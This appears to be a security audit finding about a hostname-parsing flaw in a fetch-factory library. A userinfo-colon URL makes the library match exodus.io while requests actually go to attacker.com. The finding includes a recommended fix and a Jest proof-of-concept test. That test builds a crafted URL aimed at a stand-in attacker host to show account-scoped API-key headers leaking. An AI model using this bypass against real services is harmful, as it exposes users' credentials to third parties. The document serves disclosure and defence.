### Title
Userinfo-colon parsing bypass in `getUrlHostname` causes account-scoped headers to be attached to attacker-controlled hosts - ([File: adapters/fetch-factory/src/hostname.js])

### Summary
`hostnameFromString` in `adapters/fetch-factory/src/hostname.js` truncates the hostname candidate at the first `:` and returns immediately, treating everything before the colon as the "port"-prefixed host without ever checking for a following `@` (userinfo separator). This lets an attacker craft a URL like `https://exodus.io:x@attacker.com/path` where `getUrlHostname` returns `exodus.io` (a registered, header-bearing domain) while the real network destination — as resolved by any spec-compliant URL parser (including the one used internally by `Headers`/`Request`/native `fetch`) — is `attacker.com`.

### Finding Description
`FetchFactory#buildHeaders` (adapters/fetch-factory/src/fetch-factory.js:100-111) calls `getUrlHostname(url)` and matches the result against `this.headerConfigs` keys using `hostname === key || hostname.endsWith('.'+key)`. If matched, all headers configured for that domain (via `setHeaders(headers, [hostname])`, e.g. account-scoped `x-api-key`/`x-exodus-app-id`) are attached to the outgoing request.

`getUrlHostname` → `hostnameFromString` (adapters/fetch-factory/src/hostname.js:11-37) parses the hostname manually instead of using the `URL` class:
```
const portIndex = hostname.indexOf(':')
if (portIndex !== -1) {
  hostname = hostname.slice(0, portIndex)
  return isValidHostname(hostname) ? hostname : null
}
```
This branch assumes any `:` found immediately after `://` denotes a port separator (`host:port`). It does not account for the URL-userinfo syntax `user:password@host`. For a URL string such as `https://exodus.io:secret@attacker.com/steal`, the substring after `://` is `exodus.io:secret@attacker.com/steal`; the first `:` is found at the position after `exodus.io`, so the function slices to `exodus.io`, validates it as a legit hostname, and returns it — completely ignoring the `@attacker.com` suffix that a spec-compliant parser (and the underlying `Request`/`fetch` implementation) would treat as the real host.

As a result, `#buildHeaders` finds `matchedDomain === 'exodus.io'` and attaches the headers registered for `exodus.io` (which can include sensitive account-scoped headers such as `x-api-key` and `x-exodus-app-id` set via `setDefaultExodusIdentifierHeaders`/`setHeaders`) to a request whose real destination is `attacker.com`.

### Impact Explanation
If an attacker-influenced URL (e.g. supplied via a dapp request, remote config value, or any code path that ultimately calls the shared `FetchFactory` instance's `fetch` with a string URL containing embedded userinfo) reaches `create()`'s returned fetch function, account-scoped secrets/identifiers configured for `exodus.io` (or any other registered domain) would be computed and attached as headers for a request whose real host is attacker-controlled. This is a header/origin confusion within the meaning of the audit scope (`x-api-key`, `x-exodus-app-id` disclosure to a wrong/attacker host), a real violation of the origin-scoping guarantee the header-matching logic is meant to enforce.

However, note a mitigating factor that materially reduces impact/exploitability: per the WHATWG Fetch/URL specification, constructing a `Request`/calling `fetch()` with a URL string that contains embedded credentials (`user:password@host`) causes fetch implementations (browsers, and most fetch polyfills/undici) to throw a `TypeError` ("URL contains credentials") rather than perform the network call. In `FetchFactory.create()`, headers are built first and then `this.fetchFn(url, options, ...args)` is invoked; if `fetchFn` enforces this spec behavior, the request throws before any network transmission occurs, and no header leak reaches the attacker's server. Whether this protection applies depends entirely on the specific `fetchFn` implementation supplied to `FetchFactory` at each call site (native global `fetch`, a React Native fetch polyfill, or a custom HTTP client) — this could not be confirmed from the indexed code, since no call site in this repo explicitly demonstrates the runtime `fetchFn` used in a live wallet build.

### Likelihood Explanation
Exploitability is conditioned on: (1) some attacker-influenced string being passed as the URL into a shared `FetchFactory` instance that has account-scoped headers registered for a legitimate domain, and (2) the underlying `fetchFn` not rejecting URLs with embedded userinfo (a growing but not universal guarantee across fetch implementations, e.g., some Node HTTP-based custom fetches or older polyfills may not enforce it). Given the tests found (`adapters/fetch-factory/__tests__/global-fetch.test.js`, `request-object.test.js`) exercise `setHeaders`/`create` behavior but there is no evidence a userinfo-colon case is tested, this parsing gap is a real, reproducible flaw in `getUrlHostname`/`hostnameFromString`, independent of whether the outer `fetchFn` happens to block it in a given environment.

### Recommendation
Replace the manual string-splitting hostname parser in `hostname.js` with the standard `URL` constructor (`new URL(url).hostname`), which correctly separates userinfo, host, port, path, and query per spec, eliminating this whole class of parsing-divergence bugs between the library's notion of "hostname" and the actual network destination. If a lightweight parser must be kept for performance, at minimum reject any candidate hostname string containing an `@` character, and derive the host only from the substring after the last `@` (or reject non-`URL`-parseable strings entirely, matching browser/Fetch-spec semantics of throwing on credentialed URLs) before applying the port/path/query trimming logic.

### Proof of Concept
Add a unit/fuzz test to `adapters/fetch-factory/__tests__/`:
```js
import { getUrlHostname } from '../src/hostname.js'
import { FetchFactory } from '../src/fetch-factory.js'

test('getUrlHostname must not be fooled by userinfo colon', () => {
  const url = 'https://exodus.io:secret@attacker.com/steal'
  // Real network destination (per WHATWG URL) is attacker.com
  expect(new URL(url).hostname).toBe('attacker.com')
  // BUG: library resolves to exodus.io instead
  expect(getUrlHostname(url)).toBe('exodus.io') // currently passes, demonstrating the flaw
})

test('account-scoped headers must not leak to attacker host', async () => {
  const fetchFn = jest.fn().mockResolvedValue({})
  const factory = new FetchFactory(fetchFn)
  factory.setHeaders({ 'x-api-key': 'ACCOUNT_A_SECRET' }, ['exodus.io'])
  const fetch = factory.create()

  await fetch('https://exodus.io:secret@attacker.com/steal').catch(() => {})

  const [, options] = fetchFn.mock.calls[0] ?? []
  // Expect the secret header was NOT attached for a request whose real host is attacker.com
  expect(options?.headers?.get?.('x-api-key')).not.toBe('ACCOUNT_A_SECRET')
})
```
Expected result on the current code: the second assertion fails (the secret header is attached) unless the environment's `fetchFn` independently rejects credentialed URLs — demonstrating the header/origin confusion originates in `getUrlHostname`/`hostnameFromString`, not merely in downstream fetch behavior. function hostnameFromString(url) {
```javascript
  const protocolSeparatorStart = url.indexOf(PROTOCOL_SEPARATOR)
  if (protocolSeparatorStart === -1) {
    return null
  }

  let hostname = url.slice(protocolSeparatorStart + PROTOCOL_SEPARATOR.length)

  const portIndex = hostname.indexOf(':')
  if (portIndex !== -1) {
    hostname = hostname.slice(0, portIndex)
    return isValidHostname(hostname) ? hostname : null
  }

  const rootIndicatorIndex = hostname.indexOf('/')
  if (rootIndicatorIndex !== -1) {
    hostname = hostname.slice(0, rootIndicatorIndex)
    return isValidHostname(hostname) ? hostname : null
  }

  const querySeparatorIndex = hostname.indexOf('?')
  if (querySeparatorIndex !== -1) {
    hostname = hostname.slice(0, querySeparatorIndex)
  }

  return isValidHostname(hostname) ? hostname : null
}
```
